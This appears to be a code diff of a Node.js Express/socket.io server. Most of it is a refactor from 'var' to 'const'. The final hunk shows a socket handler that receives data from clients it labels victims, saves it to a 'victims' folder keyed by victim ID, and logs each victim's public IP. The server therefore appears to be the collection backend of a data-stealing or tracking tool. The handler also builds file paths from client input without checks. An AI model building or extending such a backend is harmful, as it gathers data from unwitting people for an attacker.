@@ -4,17 +4,17 @@ TODO:
 - ADD SERVER SIDE INFO ABOUT CLIENT (HEADERS AND STUFF)
 */
 
-var express = require('express');
+const express = require('express');
 const colors = require('colors');
-var app = express();
-var http = require('http')
-var https = require('https')
-var fs = require('fs');
+const app = express();
+const http = require('http')
+const https = require('https')
+const fs = require('fs');
 // {OPTIONAL} var crypto = require('crypto')
-var auth = require('basic-auth');
-var port = 443;
-var httpport = 80;
-var options = {
+const auth = require('basic-auth');
+const port = 443;
+const httpport = 80;
+const options = {
     key: fs.readFileSync('ssl/privkey.pem'),
     cert: fs.readFileSync('ssl/cert.pem')
 };
@@ -35,7 +35,7 @@ setInterval(function() {
 */
 
 //Logging functions
-var log = {
+const log = {
     error: function(data) {
         var date = new Date();
         console.log('ERROR'.red, data);
@@ -80,11 +80,11 @@ function decrypt(text) {
 */
 
 //Starting up HTTP and HTTPS
-var server = https.createServer(options, app).listen(port, function() {
+const server = https.createServer(options, app).listen(port, function() {
     log.info("Express server listening on port " + port);
 });
 
-var serverhttp = http.createServer(app).listen(httpport, function() {
+const serverhttp = http.createServer(app).listen(httpport, function() {
     log.info("Express server listening on port " + httpport);
 });
 serverhttp.listen(httpport);
@@ -141,6 +141,6 @@ io.on('connection', function(socket, next) {
 
     socket.on('sending-info', function(data){
       var jsondata = JSON.stringify(data)
-      fs.writeFile("/home/ubuntu/victims/" + data.victimid + ".json", jsondata, console.log(data.victimid + "'s data got saved. Basic info: IP(" + data.publicip + ")")) 
+      fs.writeFile(__dirname + "/victims/" + data.victimid + ".json", jsondata, console.log(data.victimid + "'s data got saved. Basic info: IP(" + data.publicip + ")")) 
     })
 })
